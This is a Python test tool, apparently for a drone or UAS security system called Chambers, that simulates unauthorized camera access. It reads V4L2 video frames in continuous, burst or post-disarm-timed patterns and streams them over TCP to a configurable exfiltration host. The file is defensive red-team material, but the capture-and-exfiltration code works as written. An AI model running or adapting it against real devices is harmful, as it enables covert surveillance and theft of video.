#!/usr/bin/env python3
"""
rogue.py - Configurable rogue V4L2 reader for Chambers UAS testing.

Simulates unauthorized camera access in various patterns to test
the Chambers enforcement and anomaly detection layers.
"""

import argparse
import os
import socket
import struct
import sys
import time


def read_frame(fd: int, size: int = 614400) -> bytes:
    """Read a single frame from the V4L2 device file descriptor."""
    try:
        data = os.read(fd, size)
        return data
    except OSError as e:
        print(f"[rogue] Read error: {e}", file=sys.stderr)
        return b""


def open_device(device: str) -> int:
    """Open the V4L2 device and return the file descriptor."""
    try:
        fd = os.open(device, os.O_RDONLY)
        print(f"[rogue] Opened device {device} (fd={fd})")
        return fd
    except OSError as e:
        print(f"[rogue] Failed to open {device}: {e}", file=sys.stderr)
        sys.exit(1)


def exfil_connect(host: str, port: int) -> socket.socket | None:
    """Attempt to connect to exfiltration endpoint."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5.0)
        sock.connect((host, port))
        print(f"[rogue] Connected to exfil endpoint {host}:{port}")
        return sock
    except (OSError, socket.error) as e:
        print(f"[rogue] Exfil connect failed: {e}", file=sys.stderr)
        return None


def exfil_send(sock: socket.socket | None, data: bytes) -> None:
    """Send data to the exfiltration socket if connected."""
    if sock is None:
        return
    try:
        # Send length-prefixed frame
        sock.sendall(struct.pack("!I", len(data)) + data)
    except (OSError, socket.error) as e:
        print(f"[rogue] Exfil send failed: {e}", file=sys.stderr)


def mode_continuous(fd: int, duration: float, exfil_sock: socket.socket | None) -> None:
    """Continuously read frames at ~10fps for the given duration."""
    print(f"[rogue] Mode: continuous (duration={duration}s)")
    start = time.monotonic()
    frame_count = 0
    while time.monotonic() - start < duration:
        data = read_frame(fd)
        if data:
            frame_count += 1
            exfil_send(exfil_sock, data)
        time.sleep(0.1)  # ~10fps
    print(f"[rogue] Continuous mode finished: {frame_count} frames read")


def mode_burst(
    fd: int,
    duration: float,
    burst_count: int,
    burst_interval: float,
    exfil_sock: socket.socket | None,
) -> None:
    """Read frames in bursts: burst_count frames, then sleep burst_interval."""
    print(
        f"[rogue] Mode: burst (count={burst_count}, interval={burst_interval}s, duration={duration}s)"
    )
    start = time.monotonic()
    total_frames = 0
    burst_num = 0
    while time.monotonic() - start < duration:
        burst_num += 1
        print(f"[rogue] Burst #{burst_num}")
        for _ in range(burst_count):
            if time.monotonic() - start >= duration:
                break
            data = read_frame(fd)
            if data:
                total_frames += 1
                exfil_send(exfil_sock, data)
            time.sleep(0.05)
        if time.monotonic() - start < duration:
            time.sleep(burst_interval)
    print(f"[rogue] Burst mode finished: {total_frames} frames in {burst_num} bursts")


def mode_post_disarm(
    fd: int, duration: float, exfil_sock: socket.socket | None
) -> None:
    """Wait for disarm signal file, then start reading frames."""
    signal_path = "/tmp/disarm_signal"
    print(f"[rogue] Mode: post-disarm (waiting for {signal_path})")
    # Wait for the disarm signal
    while not os.path.exists(signal_path):
        time.sleep(0.5)
    print(f"[rogue] Disarm signal detected, starting frame capture")
    mode_continuous(fd, duration, exfil_sock)


def main() -> None:
    parser = argparse.ArgumentParser(
        description="Rogue V4L2 reader for Chambers UAS testing"
    )
    parser.add_argument(
        "--device",
        type=str,
        default="/dev/video10",
        help="V4L2 device path (default: /dev/video10)",
    )
    parser.add_argument(
        "--mode",
        type=str,
        choices=["continuous", "burst", "post-disarm"],
        default="continuous",
        help="Attack mode (default: continuous)",
    )
    parser.add_argument(
        "--burst-count",
        type=int,
        default=10,
        help="Number of frames per burst (default: 10)",
    )
    parser.add_argument(
        "--burst-interval",
        type=float,
        default=5.0,
        help="Seconds between bursts (default: 5.0)",
    )
    parser.add_argument(
        "--duration",
        type=float,
        default=30.0,
        help="Total duration in seconds (default: 30)",
    )
    parser.add_argument(
        "--exfil-host",
        type=str,
        default=None,
        help="Exfiltration TCP host",
    )
    parser.add_argument(
        "--exfil-port",
        type=int,
        default=None,
        help="Exfiltration TCP port",
    )
    args = parser.parse_args()

    print(f"[rogue] Starting rogue reader on {args.device}")

    # Set up exfiltration if configured
    exfil_sock = None
    if args.exfil_host and args.exfil_port:
        exfil_sock = exfil_connect(args.exfil_host, args.exfil_port)

    fd = open_device(args.device)

    try:
        if args.mode == "continuous":
            mode_continuous(fd, args.duration, exfil_sock)
        elif args.mode == "burst":
            mode_burst(fd, args.duration, args.burst_count, args.burst_interval, exfil_sock)
        elif args.mode == "post-disarm":
            mode_post_disarm(fd, args.duration, exfil_sock)
    finally:
        os.close(fd)
        if exfil_sock:
            exfil_sock.close()
        print("[rogue] Done.")


if __name__ == "__main__":
    main()
